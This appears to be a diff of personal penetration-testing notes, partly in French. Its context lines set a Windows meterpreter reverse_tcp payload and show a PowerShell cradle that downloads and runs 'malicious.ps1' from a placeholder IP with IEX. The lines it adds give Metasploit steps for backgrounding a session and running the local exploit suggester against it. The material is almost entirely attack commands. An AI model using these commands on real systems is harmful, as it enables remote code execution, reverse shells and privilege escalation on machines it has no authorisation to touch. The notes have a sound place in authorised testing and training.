@@ -80,4 +80,13 @@ set payload windows/x64/meterpreter/reverse_tcp (> options :lhost, lport)
 $e=new-object net.webclient;
 IEX $e.downloadstring('http://xxx.xxx.xxx.xxx/malicious.ps1')
 
+## Metasploit:
+- passe le meterpreter en backgroung
+meterpreter >background
+msf5 exploit(multi/handler) > search suggest
+use 3
+options
+set session 1
+run
+
 
